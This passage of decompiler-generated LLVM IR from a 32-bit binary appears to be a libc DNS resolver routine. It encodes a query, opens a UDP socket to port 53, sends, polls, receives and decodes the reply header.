  store i32 %v1_804efea, i32* %eax.global-to-local, align 4
  %v0_804efef = load i32, i32* @esp, align 4
  %v1_804efef = add i32 %v0_804efef, 56
  %v2_804efef = inttoptr i32 %v1_804efef to i32*
  %v3_804efef = load i32, i32* %v2_804efef, align 4
  store i32 %v3_804efef, i32* %edx.global-to-local, align 4
  %v1_804eff3 = add i32 %v0_804efef, 268
  %v2_804eff3 = inttoptr i32 %v1_804eff3 to i32*
  %v3_804eff3 = load i32, i32* %v2_804eff3, align 4
  store i32 %v3_804eff3, i32* %eax.global-to-local, align 4
  %v2_804effa = mul i32 %v3_804efef, 4
  %v3_804effa = add i32 %v3_804eff3, %v2_804effa
  %v4_804effa = inttoptr i32 %v3_804effa to i32*
  %v5_804effa = load i32, i32* %v4_804effa, align 4
  store i32 %v5_804effa, i32* %edx.global-to-local, align 4
  %v2_804effd = add i32 %v0_804efef, 48
  %v3_804effd = inttoptr i32 %v2_804effd to i32*
  store i32 %v5_804effa, i32* %v3_804effd, align 4
  %v0_804f001 = load i32, i32* @esp, align 4
  %v1_804f001 = add i32 %v0_804f001, 16
  %v1_804f004 = add i32 %v0_804f001, 52
  %v2_804f004 = inttoptr i32 %v1_804f004 to i32*
  %v3_804f004 = load i32, i32* %v2_804f004, align 4
  %v5_804f004 = icmp slt i32 %v3_804f004, 0
  br i1 %v5_804f004, label %dec_label_pc_804efb3.dec_label_pc_804f04a_crit_edge, label %dec_label_pc_804f00b

dec_label_pc_804efb3.dec_label_pc_804f04a_crit_edge: ; preds = %dec_label_pc_804efb3
  %v0_804f04a.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f04a

dec_label_pc_804f00b:                             ; preds = %dec_label_pc_804efb3
  store i32 %v3_804f004, i32* %eax.global-to-local, align 4
  %v1_804f00f = load i32, i32* @global_var_80561d8.401, align 8
  %v2_804f00f = sub i32 %v3_804f004, %v1_804f00f
  %v8_804f00f = xor i32 %v1_804f00f, %v3_804f004
  %v9_804f00f = xor i32 %v2_804f00f, %v3_804f004
  %v10_804f00f = and i32 %v9_804f00f, %v8_804f00f
  %v11_804f00f = icmp slt i32 %v10_804f00f, 0
  %v13_804f00f = icmp slt i32 %v2_804f00f, 0
  %v2_804f015 = icmp eq i1 %v13_804f00f, %v11_804f00f
  br i1 %v2_804f015, label %dec_label_pc_804f04a, label %dec_label_pc_804f017

dec_label_pc_804f017:                             ; preds = %dec_label_pc_804f00b
  %v2_804f017 = add i32 %v0_804f001, 12
  %v3_804f017 = inttoptr i32 %v2_804f017 to i32*
  store i32 %v3_804f004, i32* %v3_804f017, align 4
  %v1_804f018 = add i32 %v0_804f001, 8
  %v2_804f018 = inttoptr i32 %v1_804f018 to i32*
  store i32 1025, i32* %v2_804f018, align 4
  %v1_804f01d = add i32 %v0_804f001, 4
  %v2_804f01d = inttoptr i32 %v1_804f01d to i32*
  store i32 ptrtoint (i32* @global_var_8052d7c.402 to i32), i32* %v2_804f01d, align 4
  %v1_804f022 = add i32 %v0_804f001, 28
  %v2_804f022 = inttoptr i32 %v1_804f022 to i32*
  %v3_804f022 = load i32, i32* %v2_804f022, align 4
  %v6_804f022 = inttoptr i32 %v0_804f001 to i32*
  store i32 %v3_804f022, i32* %v6_804f022, align 4
  %v0_804f026 = call i32 @__GI_strncat()
  store i32 %v0_804f026, i32* %eax.global-to-local, align 4
  %v0_804f02b = load i32, i32* @esp, align 4
  %v1_804f02e = add i32 %v0_804f02b, 8
  %v2_804f02e = inttoptr i32 %v1_804f02e to i32*
  store i32 1025, i32* %v2_804f02e, align 4
  %v1_804f033 = add i32 %v0_804f02b, 52
  %v2_804f033 = inttoptr i32 %v1_804f033 to i32*
  %v3_804f033 = load i32, i32* %v2_804f033, align 4
  store i32 %v3_804f033, i32* %edx.global-to-local, align 4
  %v1_804f037 = mul i32 %v3_804f033, 4
  %v2_804f037 = add i32 %v1_804f037, 134570424
  %v3_804f037 = inttoptr i32 %v2_804f037 to i32*
  %v4_804f037 = load i32, i32* %v3_804f037, align 4
  %v6_804f037 = add i32 %v0_804f02b, 4
  %v7_804f037 = inttoptr i32 %v6_804f037 to i32*
  store i32 %v4_804f037, i32* %v7_804f037, align 4
  %v1_804f03e = add i32 %v0_804f02b, 28
  %v2_804f03e = inttoptr i32 %v1_804f03e to i32*
  %v3_804f03e = load i32, i32* %v2_804f03e, align 4
  %v6_804f03e = inttoptr i32 %v0_804f02b to i32*
  store i32 %v3_804f03e, i32* %v6_804f03e, align 4
  %v0_804f042 = call i32 @__GI_strncat()
  store i32 %v0_804f042, i32* %eax.global-to-local, align 4
  %v0_804f047 = load i32, i32* @esp, align 4
  %v1_804f047 = add i32 %v0_804f047, 16
  br label %dec_label_pc_804f04a

dec_label_pc_804f04a:                             ; preds = %dec_label_pc_804efb3.dec_label_pc_804f04a_crit_edge, %dec_label_pc_804f00b, %dec_label_pc_804f017
  %v1_804f04a = phi i32 [ %v1_804f001, %dec_label_pc_804efb3.dec_label_pc_804f04a_crit_edge ], [ %v1_804f001, %dec_label_pc_804f00b ], [ %v1_804f047, %dec_label_pc_804f017 ]
  %v0_804f04a = phi i32 [ %v0_804f04a.pre, %dec_label_pc_804efb3.dec_label_pc_804f04a_crit_edge ], [ %v3_804f004, %dec_label_pc_804f00b ], [ %v0_804f042, %dec_label_pc_804f017 ]
  %v2_804f04a = add i32 %v1_804f04a, -4
  %v3_804f04a = inttoptr i32 %v2_804f04a to i32*
  store i32 %v0_804f04a, i32* %v3_804f04a, align 4
  %v0_804f04b = load i32, i32* %eax.global-to-local, align 4
  %v2_804f04b = add i32 %v1_804f04a, -8
  %v3_804f04b = inttoptr i32 %v2_804f04b to i32*
  store i32 %v0_804f04b, i32* %v3_804f04b, align 4
  %v1_804f04c = add i32 %v1_804f04a, -12
  %v2_804f04c = inttoptr i32 %v1_804f04c to i32*
  store i32 1, i32* %v2_804f04c, align 4
  %v1_804f04e = add i32 %v1_804f04a, 184
  store i32 %v1_804f04e, i32* @eax, align 4
  %v2_804f055 = add i32 %v1_804f04a, -16
  %v3_804f055 = inttoptr i32 %v2_804f055 to i32*
  store i32 %v1_804f04e, i32* %v3_804f055, align 4
  %v2_804f056 = call i32 @__pthread_return_void(i32 -1, i32 %v15_804ef00)
  store i32 %v2_804f056, i32* %eax.global-to-local, align 4
  %v0_804f05b = load i32, i32* @esp, align 4
  %v1_804f05b = add i32 %v0_804f05b, 28
  %v2_804f05b = inttoptr i32 %v1_804f05b to i32*
  %v3_804f05b = load i32, i32* %v2_804f05b, align 4
  store i32 %v3_804f05b, i32* %eax.global-to-local, align 4
  %v1_804f05f = add i32 %v0_804f05b, 260
  %v2_804f05f = inttoptr i32 %v1_804f05f to i32*
  %v3_804f05f = load i32, i32* %v2_804f05f, align 4
  store i32 %v3_804f05f, i32* @edx, align 4
  %v1_804f066 = add i32 %v0_804f05b, 224
  %v2_804f066 = inttoptr i32 %v1_804f066 to i32*
  store i32 1, i32* %v2_804f066, align 4
  %v0_804f071 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f071 = load i32, i32* @esp, align 4
  %v2_804f071 = add i32 %v1_804f071, 216
  %v3_804f071 = inttoptr i32 %v2_804f071 to i32*
  store i32 %v0_804f071, i32* %v3_804f071, align 4
  %v1_804f07d = load i32, i32* @ebx, align 4
  %v2_804f07d = sub i32 512, %v1_804f07d
  store i32 %v2_804f07d, i32* %eax.global-to-local, align 4
  %v0_804f07f = load i32, i32* @edx, align 4
  %v1_804f07f = load i32, i32* @esp, align 4
  %v2_804f07f = add i32 %v1_804f07f, 220
  %v3_804f07f = inttoptr i32 %v2_804f07f to i32*
  store i32 %v0_804f07f, i32* %v3_804f07f, align 4
  %v0_804f086 = load i32, i32* @esp, align 4
  %v0_804f089 = load i32, i32* %eax.global-to-local, align 4
  %v2_804f089 = add i32 %v0_804f086, 8
  %v3_804f089 = inttoptr i32 %v2_804f089 to i32*
  store i32 %v0_804f089, i32* %v3_804f089, align 4
  %v1_804f08a = load i32, i32* @ebx, align 4
  %v2_804f08a = add i32 %v1_804f08a, %v2_804ee72
  %v2_804f08e = add i32 %v0_804f086, 4
  %v3_804f08e = inttoptr i32 %v2_804f08e to i32*
  store i32 %v2_804f08a, i32* %v3_804f08e, align 4
  %v1_804f08f = add i32 %v0_804f086, 216
  store i32 %v1_804f08f, i32* @eax, align 4
  %v3_804f096 = inttoptr i32 %v0_804f086 to i32*
  store i32 %v1_804f08f, i32* %v3_804f096, align 4
  %v0_804f097 = call i32 @__encode_question()
  store i32 %v0_804f097, i32* %eax.global-to-local, align 4
  %v0_804f09c = load i32, i32* @esp, align 4
  %v2_804f09f = icmp slt i32 %v0_804f097, 0
  store i32 %v0_804f097, i32* @esi, align 4
  br i1 %v2_804f09f, label %dec_label_pc_804f505, label %dec_label_pc_804f0a9

dec_label_pc_804f0a9:                             ; preds = %dec_label_pc_804f04a
  %v1_804f0a9 = add i32 %v0_804f09c, 172
  %v2_804f0a9 = inttoptr i32 %v1_804f0a9 to i16*
  store i16 2, i16* %v2_804f0a9, align 2
  %v1_804f0b3 = load i32, i32* @esp, align 4
  %v2_804f0b3 = add i32 %v1_804f0b3, -4
  %v3_804f0b3 = inttoptr i32 %v2_804f0b3 to i32*
  store i32 %v0_804f097, i32* %v3_804f0b3, align 4
  %v1_804f0b4 = add i32 %v1_804f0b3, 164
  store i32 %v1_804f0b4, i32* %eax.global-to-local, align 4
  %v2_804f0bb = add i32 %v1_804f0b3, -8
  %v3_804f0bb = inttoptr i32 %v2_804f0bb to i32*
  store i32 %v1_804f0b4, i32* %v3_804f0bb, align 4
  %v1_804f0bc = add i32 %v1_804f0b3, 32
  %v2_804f0bc = inttoptr i32 %v1_804f0bc to i32*
  %v3_804f0bc = load i32, i32* %v2_804f0bc, align 4
  %v5_804f0bc = add i32 %v1_804f0b3, -12
  %v6_804f0bc = inttoptr i32 %v5_804f0bc to i32*
  store i32 %v3_804f0bc, i32* %v6_804f0bc, align 4
  %v1_804f0c0 = add i32 %v1_804f0b3, -16
  %v2_804f0c0 = inttoptr i32 %v1_804f0c0 to i32*
  store i32 10, i32* %v2_804f0c0, align 4
  %v5_804f0c2 = call i32 @inet_pton(i32 -1, i8* %v4_804f0c2, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804f0c2, i32* %eax.global-to-local, align 4
  %v0_804f0c7 = load i32, i32* @esp, align 4
  %v1_804f0c7 = add i32 %v0_804f0c7, 16
  %tmp48 = icmp slt i32 %v5_804f0c2, 1
  br i1 %tmp48, label %dec_label_pc_804f0d8, label %dec_label_pc_804f0ce

dec_label_pc_804f0ce:                             ; preds = %dec_label_pc_804f0a9
  %v1_804f0ce = add i32 %v0_804f0c7, 172
  %v2_804f0ce = inttoptr i32 %v1_804f0ce to i16*
  store i16 10, i16* %v2_804f0ce, align 2
  %v0_804f0d8.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804f0d8

dec_label_pc_804f0d8:                             ; preds = %dec_label_pc_804f0a9, %dec_label_pc_804f0ce
  %v0_804f0ef = phi i32 [ %v1_804f0c7, %dec_label_pc_804f0a9 ], [ %v0_804f0d8.pre, %dec_label_pc_804f0ce ]
  %v1_804f0d8 = add i32 %v0_804f0ef, 156
  %v2_804f0d8 = inttoptr i32 %v1_804f0d8 to i16*
  %v3_804f0d8 = load i16, i16* %v2_804f0d8, align 2
  %v12_804f0d8 = icmp eq i16 %v3_804f0d8, 10
  %v1_804f0e1 = icmp eq i1 %v12_804f0d8, false
  %v1_804f0ef = add i32 %v0_804f0ef, 158
  %v2_804f0ef = inttoptr i32 %v1_804f0ef to i16*
  store i16 13568, i16* %v2_804f0ef, align 2
  %v0_804f0f9 = load i32, i32* @esp, align 4
  br i1 %v1_804f0e1, label %dec_label_pc_804f0ef, label %dec_label_pc_804f10f

dec_label_pc_804f0ef:                             ; preds = %dec_label_pc_804f0d8
  %v1_804f0fc = add i32 %v0_804f0f9, 32
  %v2_804f0fc = inttoptr i32 %v1_804f0fc to i32*
  %v3_804f0fc = load i32, i32* %v2_804f0fc, align 4
  %v5_804f0fc = add i32 %v0_804f0f9, -16
  %v6_804f0fc = inttoptr i32 %v5_804f0fc to i32*
  store i32 %v3_804f0fc, i32* %v6_804f0fc, align 4
  %v1_804f100 = call i32 @inet_addr(i32 -1)
  store i32 %v1_804f100, i32* %eax.global-to-local, align 4
  %v1_804f105 = load i32, i32* @esp, align 4
  %v2_804f105 = add i32 %v1_804f105, 176
  %v3_804f105 = inttoptr i32 %v2_804f105 to i32*
  store i32 %v1_804f100, i32* %v3_804f105, align 4
  %v0_804f10c = load i32, i32* @esp, align 4
  %v1_804f10c = add i32 %v0_804f10c, 16
  br label %dec_label_pc_804f10f

dec_label_pc_804f10f:                             ; preds = %dec_label_pc_804f0d8, %dec_label_pc_804f0ef
  %v1_804f10f = phi i32 [ %v1_804f10c, %dec_label_pc_804f0ef ], [ %v0_804f0f9, %dec_label_pc_804f0d8 ]
  %v0_804f10f = load i32, i32* @ecx, align 4
  %v2_804f10f = add i32 %v1_804f10f, -4
  %v3_804f10f = inttoptr i32 %v2_804f10f to i32*
  store i32 %v0_804f10f, i32* %v3_804f10f, align 4
  %v1_804f110 = add i32 %v1_804f10f, -8
  %v2_804f110 = inttoptr i32 %v1_804f110 to i32*
  store i32 17, i32* %v2_804f110, align 4
  %v1_804f112 = add i32 %v1_804f10f, -12
  %v2_804f112 = inttoptr i32 %v1_804f112 to i32*
  store i32 2, i32* %v2_804f112, align 4
  %v1_804f114 = add i32 %v1_804f10f, 156
  %v2_804f114 = inttoptr i32 %v1_804f114 to i16*
  %v3_804f114 = load i16, i16* %v2_804f114, align 2
  %v4_804f114 = zext i16 %v3_804f114 to i32
  store i32 %v4_804f114, i32* %eax.global-to-local, align 4
  %v2_804f11c = add i32 %v1_804f10f, -16
  %v3_804f11c = inttoptr i32 %v2_804f11c to i32*
  store i32 %v4_804f114, i32* %v3_804f11c, align 4
  %v3_804f11d = call i32 @socket(i32 -1, i32 %v15_804ef00, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804f11d, i32* %eax.global-to-local, align 4
  %v1_804f122 = load i32, i32* @esp, align 4
  %v2_804f122 = add i32 %v1_804f122, 36
  %v3_804f122 = inttoptr i32 %v2_804f122 to i32*
  store i32 %v3_804f11d, i32* %v3_804f122, align 4
  %v0_804f126 = load i32, i32* @esp, align 4
  %v1_804f126 = add i32 %v0_804f126, 16
  %v0_804f129 = load i32, i32* %eax.global-to-local, align 4
  %v2_804f129 = icmp slt i32 %v0_804f129, 0
  br i1 %v2_804f129, label %dec_label_pc_804f156, label %dec_label_pc_804f12d

dec_label_pc_804f12d:                             ; preds = %dec_label_pc_804f10f
  %v1_804f12d = add i32 %v0_804f126, 172
  store i32 %v1_804f12d, i32* %eax.global-to-local, align 4
  %v0_804f134 = load i32, i32* @edx, align 4
  %v2_804f134 = add i32 %v0_804f126, 12
  %v3_804f134 = inttoptr i32 %v2_804f134 to i32*
  store i32 %v0_804f134, i32* %v3_804f134, align 4
  %v1_804f135 = add i32 %v0_804f126, 8
  %v2_804f135 = inttoptr i32 %v1_804f135 to i32*
  store i32 28, i32* %v2_804f135, align 4
  %v0_804f137 = load i32, i32* %eax.global-to-local, align 4
  %v2_804f137 = add i32 %v0_804f126, 4
  %v3_804f137 = inttoptr i32 %v2_804f137 to i32*
  store i32 %v0_804f137, i32* %v3_804f137, align 4
  %v1_804f138 = add i32 %v0_804f126, 36
  %v2_804f138 = inttoptr i32 %v1_804f138 to i32*
  %v3_804f138 = load i32, i32* %v2_804f138, align 4
  %v6_804f138 = inttoptr i32 %v0_804f126 to i32*
  store i32 %v3_804f138, i32* %v6_804f138, align 4
  %v3_804f13c = call i32 @__libc_connect(i32 -1, i32 %v15_804ef00, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804f13c, i32* %eax.global-to-local, align 4
  %v0_804f141 = load i32, i32* @esp, align 4
  %v2_804f144 = icmp slt i32 %v3_804f13c, 0
  %v1_804f146 = icmp eq i1 %v2_804f144, false
  br i1 %v1_804f146, label %dec_label_pc_804f15f, label %dec_label_pc_804f148

dec_label_pc_804f148:                             ; preds = %dec_label_pc_804f12d
  %v1_804f148 = call i32 @__errno_location(i32 -1)
  store i32 %v1_804f148, i32* %eax.global-to-local, align 4
  %v1_804f14d = inttoptr i32 %v1_804f148 to i32*
  %v2_804f14d = load i32, i32* %v1_804f14d, align 4
  %v11_804f14d = icmp eq i32 %v2_804f14d, 101
  %v0_804f4bf.pre = load i32, i32* @esp, align 4
  br i1 %v11_804f14d, label %dec_label_pc_804f4bf, label %dec_label_pc_804f156

dec_label_pc_804f156:                             ; preds = %dec_label_pc_804f148, %dec_label_pc_804f10f
  %v17_804f156 = phi i32 [ %v1_804f126, %dec_label_pc_804f10f ], [ %v0_804f4bf.pre, %dec_label_pc_804f148 ]
  %v1_804f156 = add i32 %v17_804f156, 28
  %v2_804f156 = inttoptr i32 %v1_804f156 to i32*
  %v3_804f156 = load i32, i32* %v2_804f156, align 4
  %v4_804f156 = add i32 %v3_804f156, 1
  store i32 %v4_804f156, i32* %v2_804f156, align 4
  br label %dec_label_pc_804f4e0.backedge

dec_label_pc_804f15f:                             ; preds = %dec_label_pc_804f12d
  %v1_804f15f = add i32 %v0_804f141, 12
  %v2_804f15f = inttoptr i32 %v1_804f15f to i32*
  store i32 0, i32* %v2_804f15f, align 4
  %v0_804f161 = load i32, i32* @ebx, align 4
  %v1_804f161 = load i32, i32* @esi, align 4
  %v2_804f161 = add i32 %v1_804f161, %v0_804f161
  store i32 %v2_804f161, i32* %eax.global-to-local, align 4
  %v2_804f164 = add i32 %v0_804f141, 8
  %v3_804f164 = inttoptr i32 %v2_804f164 to i32*
  store i32 %v2_804f161, i32* %v3_804f164, align 4
  %v2_804f165 = add i32 %v0_804f141, 4
  %v3_804f165 = inttoptr i32 %v2_804f165 to i32*
  store i32 %v2_804ee72, i32* %v3_804f165, align 4
  %v1_804f166 = add i32 %v0_804f141, 36
  %v2_804f166 = inttoptr i32 %v1_804f166 to i32*
  %v3_804f166 = load i32, i32* %v2_804f166, align 4
  %v6_804f166 = inttoptr i32 %v0_804f141 to i32*
  store i32 %v3_804f166, i32* %v6_804f166, align 4
  %v4_804f16a = call i32 @__libc_send(i32 -1, i32 %v15_804ef00, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804f16a, i32* %eax.global-to-local, align 4
  %v0_804f16f = load i32, i32* @esp, align 4
  %v1_804f16f = add i32 %v0_804f16f, 36
  %v2_804f16f = inttoptr i32 %v1_804f16f to i32*
  %v3_804f16f = load i32, i32* %v2_804f16f, align 4
  store i32 %v3_804f16f, i32* %eax.global-to-local, align 4
  %v1_804f173 = add i32 %v0_804f16f, 232
  %v2_804f173 = inttoptr i32 %v1_804f173 to i16*
  store i16 1, i16* %v2_804f173, align 2
  %v0_804f17d = load i32, i32* %eax.global-to-local, align 4
  %v1_804f17d = load i32, i32* @esp, align 4
  %v2_804f17d = add i32 %v1_804f17d, 228
  %v3_804f17d = inttoptr i32 %v2_804f17d to i32*
  store i32 %v0_804f17d, i32* %v3_804f17d, align 4
  %v0_804f184 = load i32, i32* @esp, align 4
  %v1_804f187 = add i32 %v0_804f184, 8
  %v2_804f187 = inttoptr i32 %v1_804f187 to i32*
  store i32 10000, i32* %v2_804f187, align 4
  %v1_804f18c = add i32 %v0_804f184, 4
  %v2_804f18c = inttoptr i32 %v1_804f18c to i32*
  store i32 1, i32* %v2_804f18c, align 4
  %v1_804f18e = add i32 %v0_804f184, 228
  store i32 %v1_804f18e, i32* %eax.global-to-local, align 4
  %v3_804f195 = inttoptr i32 %v0_804f184 to i32*
  store i32 %v1_804f18e, i32* %v3_804f195, align 4
  %v0_804f196 = call i32 @__libc_poll()
  store i32 %v0_804f196, i32* %eax.global-to-local, align 4
  %v0_804f19b = load i32, i32* @esp, align 4
  %v1_804f19b = add i32 %v0_804f19b, 16
  %tmp49 = icmp slt i32 %v0_804f196, 1
  br i1 %tmp49, label %dec_label_pc_804f4bf, label %dec_label_pc_804f1a6

dec_label_pc_804f1a6:                             ; preds = %dec_label_pc_804f15f
  %v1_804f1a6 = add i32 %v0_804f19b, 12
  %v2_804f1a6 = inttoptr i32 %v1_804f1a6 to i32*
  store i32 0, i32* %v2_804f1a6, align 4
  %v1_804f1a8 = add i32 %v0_804f19b, 8
  %v2_804f1a8 = inttoptr i32 %v1_804f1a8 to i32*
  store i32 512, i32* %v2_804f1a8, align 4
  %v2_804f1ad = add i32 %v0_804f19b, 4
  %v3_804f1ad = inttoptr i32 %v2_804f1ad to i32*
  store i32 %v2_804ee72, i32* %v3_804f1ad, align 4
  %v1_804f1ae = add i32 %v0_804f19b, 36
  %v2_804f1ae = inttoptr i32 %v1_804f1ae to i32*
  %v3_804f1ae = load i32, i32* %v2_804f1ae, align 4
  %v6_804f1ae = inttoptr i32 %v0_804f19b to i32*
  store i32 %v3_804f1ae, i32* %v6_804f1ae, align 4
  %v4_804f1b2 = call i32 @__libc_recv(i32 -1, i32 %v15_804ef00, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804f1b2, i32* @eax, align 4
  %v1_804f1b7 = load i32, i32* @esp, align 4
  %v2_804f1b7 = add i32 %v1_804f1b7, 32
  %v3_804f1b7 = inttoptr i32 %v2_804f1b7 to i32*
  store i32 %v4_804f1b2, i32* %v3_804f1b7, align 4
  %v0_804f1bb = load i32, i32* @esp, align 4
  %v1_804f1bb = add i32 %v0_804f1bb, 16
  %v7_804f1c1 = icmp sgt i32 %v4_804f1b2, 11
  br i1 %v7_804f1c1, label %dec_label_pc_804f1c7, label %dec_label_pc_804f474

dec_label_pc_804f1c7:                             ; preds = %dec_label_pc_804f1a6
  %v0_804f1c7 = load i32, i32* @ebx, align 4
  %v2_804f1c7 = add i32 %v0_804f1bb, 12
  %v3_804f1c7 = inttoptr i32 %v2_804f1c7 to i32*
  store i32 %v0_804f1c7, i32* %v3_804f1c7, align 4
  %v0_804f1c8 = load i32, i32* @ebx, align 4
  %v2_804f1c8 = add i32 %v0_804f1bb, 8
  %v3_804f1c8 = inttoptr i32 %v2_804f1c8 to i32*
  store i32 %v0_804f1c8, i32* %v3_804f1c8, align 4
  %v1_804f1c9 = add i32 %v0_804f1bb, 84
  store i32 %v1_804f1c9, i32* %eax.global-to-local, align 4
  %v2_804f1cd = add i32 %v0_804f1bb, 4
  %v3_804f1cd = inttoptr i32 %v2_804f1cd to i32*
  store i32 %v1_804f1c9, i32* %v3_804f1cd, align 4
  %v3_804f1ce = inttoptr i32 %v0_804f1bb to i32*
  store i32 %v2_804ee72, i32* %v3_804f1ce, align 4
  %v0_804f1cf = call i32 @__decode_header()
  store i32 %v0_804f1cf, i32* %eax.global-to-local, align 4
  %v0_804f1d4 = load i32, i32* @esp, align 4
  %v1_804f1d4 = add i32 %v0_804f1d4, 84
  %v2_804f1d4 = inttoptr i32 %v1_804f1d4 to i32*
  %v3_804f1d4 = load i32, i32* %v2_804f1d4, align 4
  store i32 %v3_804f1d4, i32* %edx.global-to-local, align 4
  %v2_804f1d8 = add i32 %v0_804f1d4, 60
  %v3_804f1d8 = inttoptr i32 %v2_804f1d8 to i32*
  store i32 %v3_804f1d4, i32* %v3_804f1d8, align 4
  %v0_804f1dc = load i32, i32* @esp, align 4
  %v1_804f1dc = add i32 %v0_804f1dc, 16
  %v1_804f1df = add i32 %v0_804f1dc, 72
  %v2_804f1df = inttoptr i32 %v1_804f1df to i32*
  %v3_804f1df = load i32, i32* %v2_804f1df, align 4
  store i32 %v3_804f1df, i32* @eax, align 4
  %v0_804f1e3 = load i32, i32* %edx.global-to-local, align 4
  %v12_804f1e3 = icmp eq i32 %v0_804f1e3, %v3_804f1df
  %v1_804f1e5 = icmp eq i1 %v12_804f1e3, false
  br i1 %v1_804f1e5, label %dec_label_pc_804f474, label %dec_label_pc_804f1eb

dec_label_pc_804f1eb:                             ; preds = %dec_label_pc_804f1c7
  %v1_804f1eb = add i32 %v0_804f1dc, 88
  %v2_804f1eb = inttoptr i32 %v1_804f1eb to i32*
  %v3_804f1eb = load i32, i32* %v2_804f1eb, align 4
  %v4_804f1eb = icmp eq i32 %v3_804f1eb, 0
  br i1 %v4_804f1eb, label %dec_label_pc_804f474, label %dec_label_pc_804f1f6

dec_label_pc_804f1f6:                             ; preds = %dec_label_pc_804f1eb
  %v1_804f1f6 = add i32 %v0_804f1dc, 112
  %v2_804f1f6 = inttoptr i32 %v1_804f1f6 to i32*
  %v3_804f1f6 = load i32, i32* %v2_804f1f6, align 4
  store i32 %v3_804f1f6, i32* @eax, align 4
  %v9_804f1fa = icmp eq i32 %v3_804f1f6, 3
  %v1_804f1fd = icmp eq i1 %v9_804f1fa, false
  br i1 %v1_804f1fd, label %dec_label_pc_804f265, label %dec_label_pc_804f1ff

dec_label_pc_804f1ff:                             ; preds = %dec_label_pc_804f1f6
  %v1_804f1ff = add i32 %v0_804f1dc, 67
  %v2_804f1ff = inttoptr i32 %v1_804f1ff to i8*
  %v3_804f1ff = load i8, i8* %v2_804f1ff, align 1
  %v4_804f1ff = icmp eq i8 %v3_804f1ff, 0
  %v1_804f204 = icmp eq i1 %v4_804f1ff, false
  br i1 %v1_804f204, label %dec_label_pc_804f255, label %dec_label_pc_804f206

dec_label_pc_804f206:                             ; preds = %dec_label_pc_804f1ff
  %v0_804f206 = load i32, i32* @ecx, align 4
  %v2_804f206 = add i32 %v0_804f1dc, 12
  %v3_804f206 = inttoptr i32 %v2_804f206 to i32*
  store i32 %v0_804f206, i32* %v3_804f206, align 4
  %v1_804f207 = add i32 %v0_804f1dc, 8
  %v2_804f207 = inttoptr i32 %v1_804f207 to i32*
  store i32 ptrtoint (i32* @global_var_8053730.338 to i32), i32* %v2_804f207, align 4
  %v1_804f20c = add i32 %v0_804f1dc, 4
  %v2_804f20c = inttoptr i32 %v1_804f20c to i32*
  store i32 134535499, i32* %v2_804f20c, align 4
  %v1_804f211 = add i32 %v0_804f1dc, 200
  store i32 %v1_804f211, i32* @esi, align 4
  %v3_804f218 = inttoptr i32 %v0_804f1dc to i32*
  store i32 %v1_804f211, i32* %v3_804f218, align 4
  %v2_804f219 = call i32 @__pthread_return_void(i32 -1, i32 %v15_804ef00)
  store i32 %v2_804f219, i32* %eax.global-to-local, align 4
  %v0_804f21e = load i32, i32* @esp, align 4
  %v1_804f21e = inttoptr i32 %v0_804f21e to i32*
  store i32 ptrtoint (i32* @global_var_8053730.338 to i32), i32* %v1_804f21e, align 4
  %v1_804f225 = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_804f225, i32* %eax.global-to-local, align 4
  %v0_804f22a = load i32, i32* @global_var_80561d8.401, align 8
  store i32 %v0_804f22a, i32* %ebx.global-to-local, align 4
  %v0_804f230 = load i32, i32* @esp, align 4
  %v1_804f230 = inttoptr i32 %v0_804f230 to i32*
  %v2_804f230 = load i32, i32* %v1_804f230, align 4
  store i32 %v2_804f230, i32* @eax, align 4
  %v3_804f230 = add i32 %v0_804f230, 4
  %v1_804f231 = inttoptr i32 %v3_804f230 to i32*
  %v2_804f231 = load i32, i32* %v1_804f231, align 4
  store i32 %v2_804f231, i32* %edx.global-to-local, align 4
  %v1_804f232 = add i32 %v0_804f22a, -1
  store i32 %v1_804f232, i32* @ebx, align 4
  store i32 1, i32* %v1_804f231, align 4
  %v0_804f235 = load i32, i32* @esi, align 4
  store i32 %v0_804f235, i32* %v1_804f230, align 4
  %v2_804f236 = call i32 @__pthread_return_void(i32 -1, i32 %v15_804ef00)
  store i32 %v2_804f236, i32* %eax.global-to-local, align 4
  %v0_804f23b = load i32, i32* @esp, align 4
  %v1_804f23e = add i32 %v0_804f23b, 52
  %v2_804f23e = inttoptr i32 %v1_804f23e to i32*
  %v3_804f23e = load i32, i32* %v2_804f23e, align 4
  %v4_804f23e = load i32, i32* @ebx, align 4
  %v5_804f23e = sub i32 %v3_804f23e, %v4_804f23e
  %v11_804f23e = xor i32 %v4_804f23e, %v3_804f23e
  %v12_804f23e = xor i32 %v5_804f23e, %v3_804f23e
  %v13_804f23e = and i32 %v12_804f23e, %v11_804f23e
  %v14_804f23e = icmp slt i32 %v13_804f23e, 0
  %v16_804f23e = icmp slt i32 %v5_804f23e, 0
  %v2_804f242 = icmp eq i1 %v16_804f23e, %v14_804f23e
  br i1 %v2_804f242, label %dec_label_pc_804f255, label %dec_label_pc_804f244

dec_label_pc_804f244:                             ; preds = %dec_label_pc_804f206
  %v1_804f244 = add i32 %v0_804f23b, 60
  %v2_804f244 = inttoptr i32 %v1_804f244 to i32*
  %v3_804f244 = load i32, i32* %v2_804f244, align 4
  store i32 %v3_804f244, i32* %edx.global-to-local, align 4
  %v3_804f248 = load i32, i32* %v2_804f23e, align 4
  %v4_804f248 = add i32 %v3_804f248, 1
  store i32 %v4_804f248, i32* %v2_804f23e, align 4
  %v0_804f24c = load i32, i32* %edx.global-to-local, align 4
  %v1_804f24c = load i32, i32* @esp, align 4
  %v2_804f24c = add i32 %v1_804f24c, 56
  %v3_804f24c = inttoptr i32 %v2_804f24c to i32*
  store i32 %v0_804f24c, i32* %v3_804f24c, align 4
  br label %dec_label_pc_804f4e0.backedge

dec_label_pc_804f255:                             ; preds = %dec_label_pc_804f206, %dec_label_pc_804f1ff
  %v0_804f255 = call i32 @__GI___h_errno_location()
  store i32 %v0_804f255, i32* %eax.global-to-local, align 4
  %v1_804f25a = inttoptr i32 %v0_804f255 to i32*
  store i32 1, i32* %v1_804f25a, align 4
  br label %dec_label_pc_804f518

